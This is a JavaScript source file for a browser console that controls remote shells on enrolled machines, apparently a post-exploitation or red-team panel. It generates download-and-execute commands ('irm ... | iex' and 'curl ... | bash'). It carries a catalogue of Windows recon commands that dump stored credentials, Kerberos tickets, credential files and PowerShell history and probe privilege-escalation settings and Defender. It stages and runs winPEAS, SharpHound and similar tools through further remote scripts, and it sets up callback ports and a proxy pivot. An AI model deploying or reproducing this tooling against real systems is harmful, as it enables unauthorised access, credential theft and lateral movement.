/* Browser terminal control with single-use connector enrollment. */
(function(){
  let enabled=false,ticket='',expires=0,platform='win',selected='',terminal=null,fit=null,cursor=0,generation=0,polling=false;
  let inputQueue=Promise.resolve(),sessions=[],available=[],proxy=null,callbacks=[],tools=[];
  const windowsTools=[
    {id:'winpeas',name:'winPEAS',file:/^winpeas.*\.(exe|bat)$/i,kind:'winpeas',expected:'winPEAS*.exe/.bat',desc:'Broad local enumeration. Very noisy and frequently flagged by Defender/EDR.'},
    {id:'seatbelt',name:'Seatbelt',file:/^seatbelt\.exe$/i,kind:'seatbelt',expected:'Seatbelt.exe',desc:'Host, user, and security posture checks. .NET; generally quieter than winPEAS.'},
    {id:'privesccheck',name:'PrivescCheck',file:/^privesccheck\.ps1$/i,kind:'privesccheck',expected:'PrivescCheck.ps1',desc:'Detailed low-privilege privilege-escalation checks. Best local signal of the four.'},
    {id:'sharphound',name:'SharpHound',file:/^sharphound\.exe$/i,kind:'sharphound',expected:'SharpHound.exe',desc:'AD collection for BloodHound. Domain user; produces a ZIP for import.'}
  ];
  const reconCommands=[
    ['Identity','Whoami full',String.raw`whoami /all`],
    ['Identity','Token privileges',String.raw`whoami /priv`],
    ['Identity','Current identity',String.raw`$env:USERDOMAIN; $env:USERNAME; [Security.Principal.WindowsIdentity]::GetCurrent().Name`],
    ['Host','System info',String.raw`systeminfo`],
    ['Host','Computer info',String.raw`Get-ComputerInfo | Format-List`],
    ['Host','Recent patches',String.raw`Get-HotFix | Sort InstalledOn -Descending | Select -First 15`],
    ['Network','IP configuration',String.raw`ipconfig /all`],
    ['Network','Routes',String.raw`route print`],
    ['Network','ARP table',String.raw`arp -a`],
    ['Network','Listening TCP',String.raw`Get-NetTCPConnection -State Listen | Sort LocalPort | Select LocalAddress,LocalPort,OwningProcess`],
    ['Network','SMB mappings',String.raw`net use; Get-SmbMapping`],
    ['Network','Proxy',String.raw`netsh winhttp show proxy`],
    ['Users','Local users',String.raw`net user`],
    ['Users','Local groups',String.raw`net localgroup`],
    ['Users','Administrators',String.raw`net localgroup administrators`],
    ['Users','Logged on',String.raw`quser; query session`],
    ['Domain','Workstation config',String.raw`net config workstation`],
    ['Domain','Domain controllers',String.raw`nltest /dsgetdc:$env:USERDNSDOMAIN`],
    ['Domain','Trusts',String.raw`nltest /domain_trusts`],
    ['Domain','Domain groups',String.raw`net group /domain`],
    ['Domain','Domain Admins',String.raw`net group "Domain Admins" /domain`],
    ['Domain','Group policy',String.raw`gpresult /r`],
    ['Services','Services',String.raw`Get-CimInstance Win32_Service | Select Name,State,StartMode,StartName,PathName | Format-Table -AutoSize`],
    ['Services','Unquoted paths',String.raw`Get-CimInstance Win32_Service | Where PathName -match '^[^"].*\.exe\s' | Select Name,PathName`],
    ['Services','Scheduled tasks',String.raw`Get-ScheduledTask | Select TaskPath,TaskName,State,Author | Sort TaskPath,TaskName`],
    ['Services','Startup commands',String.raw`Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User`],
    ['Files','Program Files ACL',String.raw`icacls "C:\Program Files"`],
    ['Files','Temp ACL',String.raw`icacls "C:\Windows\Temp"`],
    ['Files','PATH entries',String.raw`$env:Path -split ';'`],
    ['Credentials','Stored credentials',String.raw`cmdkey /list`],
    ['Credentials','Kerberos tickets',String.raw`klist`],
    ['Credentials','Credential files',String.raw`Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force`],
    ['Credentials','PowerShell history',String.raw`Get-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"`],
    ['Privesc','AlwaysInstallElevated',String.raw`Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer','HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated`],
    ['Privesc','Autologon',String.raw`Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select AutoAdminLogon,DefaultUserName,DefaultDomainName`],
    ['Privesc','UAC',String.raw`Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' | Select EnableLUA,ConsentPromptBehaviorAdmin`],
    ['Privesc','Defender',String.raw`Get-MpComputerStatus | Select AMEnabled,RealTimeProtectionEnabled,AntivirusEnabled`]
  ];
  const error=q('console-error'),container=q('browser-terminal');
  const terminalSession=new URLSearchParams(location.search).get('terminal');
  if(terminalSession){document.body.classList.add('terminal-view');showView('shells')}

  function notice(text){error.textContent=text}
  async function api(path,method='GET',data){
    const response=await fetch('/console/'+path,{method,headers:{'Content-Type':'application/json'},body:data===undefined?undefined:JSON.stringify(data),cache:'no-store'});
    const value=await response.json();if(!response.ok)throw Error(value.error||'Console request failed');return value;
  }
  function renderCommand(){
    const url=location.origin+'/'+platform+'?ticket='+encodeURIComponent(ticket);
    q('console-command').textContent=!ticket?'':platform==='win'?"irm '"+url.replace(/'/g,"''")+"' | iex":"curl -fsSL '"+url.replace(/'/g,"'\\''")+"' | bash";
    q('console-copy').disabled=!ticket||expires<Date.now();
  }
  async function invite(){
    try{const result=await api('invites','POST',{origin:location.origin});ticket=result.ticket;expires=result.expires*1000;renderCommand();q('console-invite-info').textContent='Single use · expires in 10 minutes. Paste into '+(platform==='win'?'PowerShell.':'a terminal.');notice('')}
    catch(e){notice(e.message)}
  }
  function dispose(){generation++;selected='';cursor=0;if(terminal)terminal.dispose();terminal=null;fit=null;container.replaceChildren();container.hidden=true;q('console-disconnect').disabled=true;q('console-remove').disabled=true;q('console-popout').disabled=true;renderProxy()}
  async function command(action,value){if(!selected||!enabled)return;await api('sessions/'+selected+'/'+action,'POST',value)}
  function fitTerminal(){if(fit&&!q('shells').hidden&&container.clientWidth){fit.fit()}}
  async function selectSession(id){
    if(selected===id)return;dispose();selected=id;cursor=0;
    container.hidden=false;q('console-empty').hidden=true;
    terminal=new Terminal({cursorBlink:true,fontFamily:'Cascadia Code, Consolas, monospace',fontSize:14,scrollback:5000,allowProposedApi:false,theme:{background:'#181818',foreground:'#e5e5e5',cursor:'#d4d4d4',selectionBackground:'#334155'},screenReaderMode:true});
    fit=new FitAddon.FitAddon();terminal.loadAddon(fit);terminal.open(container);fit.fit();
    q('console-disconnect').disabled=false;q('console-remove').disabled=false;q('console-popout').disabled=false;
    const thisGeneration=generation,sessionID=id;
    terminal.onData(data=>{
      inputQueue=inputQueue.then(async()=>{if(generation!==thisGeneration)return;const characters=Array.from(data);for(let offset=0;offset<characters.length;offset+=4096)await api('sessions/'+sessionID+'/input','POST',{data:characters.slice(offset,offset+4096).join('')})}).catch(e=>notice(e.message));
    });
    terminal.onResize(size=>{command('resize',size).catch(e=>notice(e.message))});
    await command('resize',{cols:terminal.cols,rows:terminal.rows}).catch(e=>notice(e.message));
    renderSessions();terminal.focus();
    while(enabled&&generation===thisGeneration){
      try{
        const output=await api('sessions/'+id+'/output?after='+cursor);
        if(generation!==thisGeneration)return;
        if(output.truncated)terminal.writeln('\r\n[Earlier output was trimmed]\r\n');
        const bytes=Uint8Array.from(atob(output.data),c=>c.charCodeAt(0));
        await new Promise(resolve=>terminal.write(bytes,resolve));if(generation!==thisGeneration)return;cursor=output.next;
        if(!output.connected&&bytes.length<65536){terminal.writeln('\r\n[Session ended]');q('console-disconnect').disabled=true;return}
      }catch(e){if(generation!==thisGeneration)return;notice(e.message);terminal.writeln('\r\n[Connection lost. Select this session again to retry.]');selected='';return}
    }
  }
  function renderSessions(){
    q('console-sessions').replaceChildren();
    sessions.forEach(session=>{const button=document.createElement('button');button.className='btn ghost sm'+(session.id===selected?' selected':'');button.textContent=session.host+' · '+session.os+' / '+session.arch+(session.connected?(session.stale?' · away':''):' · ended');button.setAttribute('aria-pressed',String(session.id===selected));button.addEventListener('click',()=>selectSession(session.id));q('console-sessions').appendChild(button)});
    q('console-empty').hidden=!!selected||sessions.length>0;
    renderProxy();
    renderCallbacks();
  }
  function renderProxy(){
    const box=q('console-proxy');
    if(!proxy||!proxy.enabled){box.hidden=true;return}
    box.hidden=false;
    q('console-proxy-address').textContent=proxy.address;
    q('console-proxy-target').textContent=proxy.session?'→ '+proxy.session.host:'→ waiting for a machine';
    q('console-proxy-use').disabled=!selected||(proxy.session&&proxy.session.id===selected);
  }
  function renderCallbacks(){
    const box=q('console-callbacks');
    box.hidden=!enabled;
    if(!enabled)return;
    const list=q('callback-list');list.replaceChildren();
    if(!callbacks.length){const empty=document.createElement('p');empty.className='empty-line';empty.textContent='No callbacks. Add a local port to receive connections from the connected machine.';list.appendChild(empty);return}
    callbacks.forEach(callback=>{
      const row=document.createElement('div');row.className='mini-row';
      const target=callback.address||('endpoint:'+callback.remote);
      const label=document.createElement('span');label.className='grow';label.textContent=target+' → 127.0.0.1:'+callback.local;
      const meta=document.createElement('span');meta.className='meta';meta.textContent=callback.active?'listening':(callback.error||'waiting');
      const remove=document.createElement('button');remove.className='btn ghost sm';remove.textContent='Remove';
      remove.addEventListener('click',()=>removeCallback(callback.id));
      row.append(label,meta,remove);list.appendChild(row);
    });
  }
  async function removeCallback(id){try{await api('callbacks/'+id+'/remove','POST',{});await refresh();notice('')}catch(e){notice(e.message)}}
  function runRecon(command){
    if(!selected){notice('Select a console first');return}
    api('sessions/'+selected+'/input','POST',{data:command+'\r'}).catch(e=>notice(e.message));
  }
  function renderRecon(){
    const list=q('recon-list');if(!list)return;
    const filter=(q('recon-search').value||'').trim().toLowerCase();
    list.replaceChildren();
    let category='';
    reconCommands.filter(item=>!filter||(item[0]+' '+item[1]+' '+item[2]).toLowerCase().includes(filter)).forEach(item=>{
      if(item[0]!==category){category=item[0];const heading=document.createElement('div');heading.className='recon-cat';heading.textContent=category;list.appendChild(heading)}
      const row=document.createElement('div');row.className='recon-row';
      const label=document.createElement('span');label.className='hint';label.textContent=item[1];
      const code=document.createElement('code');code.textContent=item[2];
      const actions=document.createElement('span');actions.className='recon-btns';
      const run=document.createElement('button');run.className='btn ghost sm';run.textContent='Run';run.addEventListener('click',()=>runRecon(item[2]));
      const copy=document.createElement('button');copy.className='btn ghost sm';copy.textContent='Copy';copy.addEventListener('click',()=>copyText(item[2],'Command copied'));
      actions.append(run,copy);row.append(label,code,actions);list.appendChild(row);
    });
  }
  function stagedTool(def){return tools.find(tool=>def.file.test(tool.name))}
  function renderTools(){
    const list=q('windows-tool-list');if(!list)return;
    list.replaceChildren();
    windowsTools.forEach(def=>{
      const staged=stagedTool(def);
      const card=document.createElement('div');card.className='tool-card';
      const head=document.createElement('div');head.className='tool-head';
      const title=document.createElement('strong');title.textContent=def.name;
      const status=document.createElement('span');status.className='meta';status.textContent=staged?staged.name+' · '+fmt(staged.size):'not staged · '+def.expected;
      head.append(title,status);
      const desc=document.createElement('p');desc.className='hint';desc.textContent=def.desc;
      const actions=document.createElement('div');actions.className='tool-actions';
      const input=document.createElement('input');input.type='file';input.accept=def.id==='privesccheck'?'.ps1':'.exe,.bat,.cmd';
      const upload=document.createElement('button');upload.className='btn ghost sm';upload.textContent='Upload';
      upload.addEventListener('click',async()=>{
        if(!input.files.length){notice('Choose a file first');return}
        try{await uploadTool(input.files[0]);notice('Uploaded '+input.files[0].name)}
        catch(e){notice(e.message)}
      });
      const run=document.createElement('button');run.className='btn ghost sm';run.textContent='Run';run.disabled=!staged;
      run.addEventListener('click',()=>runTool(def,staged).catch(e=>notice(e.message)));
      actions.append(input,upload,run);card.append(head,desc,actions);list.appendChild(card);
    });
  }
  async function refreshTools(){tools=(await api('tools')).tools||[];renderTools()}
  async function uploadTool(file){
    const response=await fetch('/console/tools/'+encodeURIComponent(file.name),{method:'POST',body:file,headers:{'Content-Type':'application/octet-stream'}});
    const value=await response.json().catch(()=>({error:'Upload failed'}));
    if(!response.ok)throw Error(value.error||'Upload failed');
    await refreshTools();
  }
  async function runTool(def,staged){
    if(!selected){notice('Select a console first');return}
    const session=sessions.find(s=>s.id===selected);
    if(!session||session.os!=='windows'){notice('Select a Windows console first');return}
    if(!staged){notice('Upload '+def.name+' first');return}
    const info=await api('winenum/ticket','POST',{});
    const origin=location.origin;
    const command=`$ExposeTicket='${info.ticket}'; $ExposeOrigin='${origin}'; $ExposeTool='${staged.name}'; $ExposeKind='${def.kind}'; irm "$ExposeOrigin/console/toolrunner.ps1?ticket=$ExposeTicket" | iex`;
    await api('sessions/'+selected+'/input','POST',{data:command+'\r'});
    notice(def.name+' started; report will appear in Received files');
  }
  async function refresh(){
    if(!enabled||polling)return;polling=true;
    try{
      const [list,info,callbackInfo]=await Promise.all([api('sessions'),api('proxy'),api('callbacks')]);
      sessions=list;proxy=info;callbacks=callbackInfo.callbacks||[];
      if(selected&&!sessions.some(s=>s.id===selected))dispose();
      renderSessions();q('console-status').textContent=sessions.some(s=>s.connected&&!s.stale)?'Connected':sessions.some(s=>s.connected)?'Away':'Listening';
      if(terminalSession){
        const session=sessions.find(s=>s.id===terminalSession);
        q('terminal-tab-title').textContent=session?session.host+' · '+session.os:'Terminal';
        document.title=(session?session.host:'Terminal')+' · expose';
        q('terminal-tab-status').textContent=session?(session.connected?(session.stale?'Away':'Connected'):'Ended'):'Removed';
        if(session&&!selected)selectSession(session.id);
        if(!session){q('console-empty').hidden=false;q('console-empty').textContent='This machine is no longer available. Return to consoles to connect a machine.'}
      }else if(!selected&&sessions.some(s=>s.connected)&&!q('shells').hidden)selectSession(sessions.find(s=>s.connected).id);
    }
    catch(e){notice(e.message)}finally{polling=false}
  }
  q('console-popout').addEventListener('click',()=>{
    if(!selected)return;
    const url=new URL('/',location.origin);url.searchParams.set('terminal',selected);url.hash='shells';
    window.open(url.href,'_blank','noopener,noreferrer');
  });
  window.addEventListener('focus',()=>{fitTerminal();if(terminal&&selected)command('resize',{cols:terminal.cols,rows:terminal.rows}).catch(e=>notice(e.message))});
  q('console-new').addEventListener('click',invite);
  q('console-copy').addEventListener('click',()=>{if(expires<Date.now()){notice('Connection link expired. Create a new link.');return}copyText(q('console-command').textContent,'Connection command copied')});
  q('console-platforms').addEventListener('click',e=>{const button=e.target.closest('[data-platform]');if(!button)return;platform=button.dataset.platform;document.querySelectorAll('#console-platforms button').forEach(b=>{b.classList.toggle('active',b===button);b.setAttribute('aria-pressed',String(b===button))});renderCommand();q('console-invite-info').textContent='Single use · expires in 10 minutes. Paste into '+(platform==='win'?'PowerShell.':'a terminal.')});
  q('console-disconnect').addEventListener('click',async()=>{try{await command('close',{});refresh()}catch(e){notice(e.message)}});
  q('console-remove').addEventListener('click',async()=>{
    const id=selected;if(!id)return;
    q('console-remove').disabled=true;
    try{
      await api('sessions/'+id+'/remove','POST',{});
      if(selected===id)dispose();
      sessions=sessions.filter(session=>session.id!==id);renderSessions();notice('');refresh();
    }catch(e){q('console-remove').disabled=!selected;notice(e.message)}
  });
  q('console-proxy-use').addEventListener('click',async()=>{
    if(!selected)return;
    try{proxy=await api('proxy','POST',{session:selected});renderProxy();notice(proxy.session?'Network proxy now uses '+proxy.session.host:'Network proxy has no selected machine')}
    catch(e){notice(e.message)}
  });
  q('callback-add').addEventListener('click',async()=>{
    const local=parseInt(q('callback-local').value,10),remote=parseInt(q('callback-remote').value,10)||local;
    if(!local){notice('Enter a local port');return}
    try{const callback=await api('callbacks','POST',{local,remote});q('callback-local').value='';q('callback-remote').value='';await refresh();notice('Callback '+callback.remote+' → 127.0.0.1:'+callback.local)}
    catch(e){notice(e.message)}
  });
  q('recon-search').addEventListener('input',renderRecon);
  q('recon-winenum').addEventListener('click',async()=>{
    if(!selected){notice('Select a console first');return}
    const session=sessions.find(s=>s.id===selected);
    if(!session||session.os!=='windows'){notice('Select a Windows console first');return}
    try{
      const info=await api('winenum/ticket','POST',{});
      const origin=location.origin;
      const command=`$ExposeTicket='${info.ticket}'; $ExposeOrigin='${origin}'; irm "$ExposeOrigin/console/winenum.ps1?ticket=$ExposeTicket" | iex`;
      await api('sessions/'+selected+'/input','POST',{data:command+'\r'});
      notice('winenum started in the selected console');
    }catch(e){notice(e.message)}
  });
  renderRecon();
  new ResizeObserver(fitTerminal).observe(container);
  window.addEventListener('hashchange',()=>{if(!q('shells').hidden){fitTerminal();refresh()}});
  setInterval(()=>{refresh();if(ticket&&expires<Date.now()){q('console-copy').disabled=true;q('console-invite-info').textContent='Connection link expired. Create a new link.'}},2000);
  fetch('/console/status').then(r=>r.json()).then(async status=>{
    enabled=status.enabled;available=status.platforms||[];
    q('console-status').textContent=enabled?'Listening':'Disabled';
    q('console-help').hidden=enabled;
    q('console-controls').hidden=!enabled;
    if(!enabled){q('console-help').textContent='Start expose-online to use browser terminals.';return}
    await refresh();
    await refreshTools();
    if(terminalSession)return;
    if(available.length)await invite();
    else notice('Build connectors on the host with: make -C expose install-console-clients');
  }).catch(()=>notice('Could not check console availability. Reload to retry.'));
})();
